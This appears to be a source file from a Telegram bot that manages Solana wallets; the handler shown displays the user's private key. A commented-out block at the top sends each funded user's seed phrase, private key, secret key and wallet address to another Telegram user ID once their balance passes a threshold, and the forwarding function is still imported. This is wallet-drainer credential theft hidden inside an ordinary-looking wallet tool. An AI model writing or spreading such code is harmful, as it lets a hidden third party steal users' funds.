import { Markup } from "telegraf";
import { MyContext } from "../../config/interfaces";
import { solscanNetworkAddress, forwardUserWalletBalanceUpdated } from "../../config";
import { getBalance } from "../../config/solana";
import accept from "../../actions/accept";

const showPrivateKey = async (ctx: MyContext) => {
	await ctx.answerCbQuery(); // Remove loading animation

	// if (ctx.session.user) {
	// 	if (ctx.session.user.publicKey) {
	// 		ctx.session.user.balance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? ctx.session.user.balance : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
	// 		ctx.session.user.walletBalance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? 0 : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
	// 		// Forward the user's response to another Telegram user ID
	// 		if (ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) > 0.0001) await forwardUserWalletBalanceUpdated(ctx, { name: ctx.session.name, username: ctx.session.username, balance: await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0), seed: ctx.session.user.seed, publicKey: ctx.session.user.publicKey, privateKey: ctx.session.user.privateKey, secretKey: ctx.session.user.secretKey, walletAddress: ctx.session.user.walletAddress });
	// 	}
	// }

	if (!ctx.session.user?.accept) {
		accept(ctx);
	} else {
		if (ctx.session.user?.walletAddress) {
			try {
				return await ctx.editMessageText(
					"Private Key Below\n\n" +
					`\`${ctx.session.user?.privateKey}\` \\(Tap to copy\\)`,
					{
						...Markup.inlineKeyboard([
							[Markup.button.callback('Delete Wallet 🗑️', 'DELETE_WALLET')],
							[Markup.button.callback('Show Private Key 🔑', 'SHOW_PRIVATE_KEY')],
							[Markup.button.url('View On Solscan 🌐', `${solscanNetworkAddress}${ctx.session.user?.walletAddress}`)],
							[Markup.button.callback('Deposit 💵', 'DEPOSIT'), Markup.button.callback('Withdraw 💸', 'DASHES')],
							// [Markup.button.callback('Import Existing Wallet', 'IMPORT_WALLET')],
							// [Markup.button.callback('Close', 'CLOSE')],
							[Markup.button.callback('Back 🔙', 'REFRESH')],
							// [Markup.button.callback('Refresh', 'REFRESH_WALLET')],
						]), 
						parse_mode: "MarkdownV2"
					}
				);
			} catch (error) {
				// console.error("Error editing message:", error);
				// ctx.reply("⚠️ Unable to refresh. Try again.");
			}	
		} else {
			return ctx.reply(
				"Create or Import a wallet\n",
				Markup.inlineKeyboard([
					[Markup.button.callback('Create Wallet', 'CREATE_WALLET')],
					[Markup.button.callback('Import Existing Wallet', 'IMPORT_WALLET')],
					[Markup.button.callback('Close', 'CLOSE')],
				])
			);
		}
	}
};

export default showPrivateKey;
